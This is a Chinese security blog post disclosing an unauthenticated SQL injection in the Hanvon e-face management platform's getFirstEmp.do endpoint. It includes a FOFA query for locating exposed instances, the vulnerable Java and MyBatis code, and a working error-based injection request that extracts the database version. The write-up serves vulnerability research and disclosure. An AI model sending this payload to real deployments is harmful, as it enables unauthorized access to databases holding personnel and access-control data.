---
title: "汉王e脸通综合管理平台 getFirstEmp.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-getFirstEmp-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-getfirstemp.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 getFirstEmp.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/18 08:28
- 801浏览
- [0评论](#comment)
- 36分钟阅读

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `getFirstEmp.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `FirstPeopleOpenController` 里关于 `getFirstEmp` 的实现

```
@RequestMapping(
        value = {"getFirstEmp.do"},
        method = {RequestMethod.GET}
    )
    @ResponseBody
    public RequestJson getFirstEmp(@RequestParam(required = false) Integer page, @RequestParam(required = false) Integer pageSize, @RequestParam(required = false) String name, @RequestParam(required = false) Long groupId, @RequestParam(required = false) Long departmentId, @RequestParam(required = false) String order, @RequestParam(required = false) String columnKey) {
        RequestJson result = new RequestJson();

        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            PageHelper.startPage(page, pageSize);
            EmployeeInfoParam record = new EmployeeInfoParam();
            if (name != null) {
                record.setKey(name);
            }

            if (null != departmentId) {
                record.setDepartmentId(departmentId);
            }

            record.setOrder(order);
            record.setColumnKey(columnKey);
            if (null == groupId) {
                result.setMsg("操作失败");
            } else {
                record.setTeamId(groupId);
                List<EmployeeInfoVO> employeeList = this.firstPeopleOpenAsm.getEmployeeByDoorId(record);
                PageInfo<EmployeeInfoVO> info = new PageInfo(employeeList);
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 AccessFirstOpenDoorDao.xml

代码安全审计

```
<select id="getEmployeeByDoorId" resultType="com.hanvon.iface.tpm.access.EmployeeInfoVO">
    select afoe.ID, ei.SZ_NAME name,ei.SZ_EMPLOY_ID attendanceCode,ed.NG_ID departmentId,ei.SZ_TELEPHONE phone,ed.SZ_NAME departmentName
    from ACCESS_FIRST_OPEN_EMPLOYEE afoe
    left join SYS_USER ei ON ei.NG_ID = afoe.EMPLOYEE_ID
    left join SYS_USER_BRANCH sub on sub.NG_USER_ID = ei.NG_ID
    left join SYS_BRANCH ed on ed.NG_ID = sub.NG_BRANCH_ID
    where ei.NT_USER_STATE
    <if test="teamId != null">
      and afoe.DOOR_ID = #{teamId}
    </if>
    <if test="key != null and key != ''">
      and (ei.SZ_NAME like CONCAT('%',#{key}, '%')
      or  ei.SZ_EMPLOY_ID like concat('%', #{key},'%')
      or  ei.SZ_TELEPHONE like concat('%', #{key},'%'))
    </if>
    <if test="departmentId != null">
      AND ED.SZ_BRANCH_PATH like CONCAT((SELECT SZ_BRANCH_PATH from SYS_BRANCH WHERE NG_ID = #{departmentId,jdbcType=INTEGER}), '%')
    </if>
    ORDER BY
    <if test="order == null or order == ''">
      afoe.ID DESC
    </if>
    <if test="order != null and order != ''">
      ${columnKey} ${order}
    </if>
  </select>
```

需要注意必须存在 `groupId` 参数，否则就不会进入sql处理流程。

漏洞扫描服务

```
if (null == groupId) {
    result.setMsg("操作失败");
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/firstPeopleOpen/getFirstEmp.do?recoToken=67mds2pxXQb&page=1&pageSize=10&groupId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 getFirstEmp.do SQL注入漏洞](images/img-001-afa10ccdb268.webp)](https://image.mrxn.net/3cc68394aa544b379e58a674e0bfe75c.webp)

成功利用报错注入获取到数据版本号

物流软件安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
